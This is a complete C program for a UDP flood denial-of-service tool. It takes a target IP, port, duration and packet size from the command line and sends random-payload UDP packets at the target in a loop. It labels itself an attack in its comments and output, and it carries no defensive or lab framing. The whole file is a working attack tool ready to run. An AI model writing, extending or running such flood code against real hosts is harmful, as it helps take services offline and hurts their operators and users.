#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define MAX_PACKET_SIZE 65507  // UDP max packet size
#define DEFAULT_PORT 80         // Default target port

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
} attack_params;

volatile int keep_running = 1;

// Signal handler to stop attack cleanly
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

// Function to perform UDP flood attack
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char *packet;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Configure target server
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    // Allocate memory for packet
    packet = (char *)malloc(params->packet_size);
    if (!packet) {
        perror("Memory allocation failed");
        close(sock);
        pthread_exit(NULL);
    }

    // Generate random payload
    generate_random_payload(packet, params->packet_size);

    // Start flooding
    time_t start_time = time(NULL);
    while ((time(NULL) - start_time) < params->duration && keep_running) {
        sendto(sock, packet, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <Port> <Duration> <Packet Size>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Parse arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int packet_size = atoi(argv[4]);

    // Validate packet size
    if (packet_size <= 0 || packet_size > MAX_PACKET_SIZE) {
        printf("Invalid packet size. Max: %d bytes.\n", MAX_PACKET_SIZE);
        return EXIT_FAILURE;
    }

    // Handle Ctrl+C to stop attack
    signal(SIGINT, handle_signal);

    // Attack parameters
    attack_params params;
    params.target_ip = target_ip;
    params.target_port = target_port;
    params.duration = duration;
    params.packet_size = packet_size;

    // Launch attack
    printf("Starting UDP flood attack on %s:%d for %d seconds...\n", target_ip, target_port, duration);
    pthread_t attack_thread;
    pthread_create(&attack_thread, NULL, udp_flood, &params);
    pthread_join(attack_thread, NULL);

    printf("Attack completed.\n");
    return EXIT_SUCCESS;
}
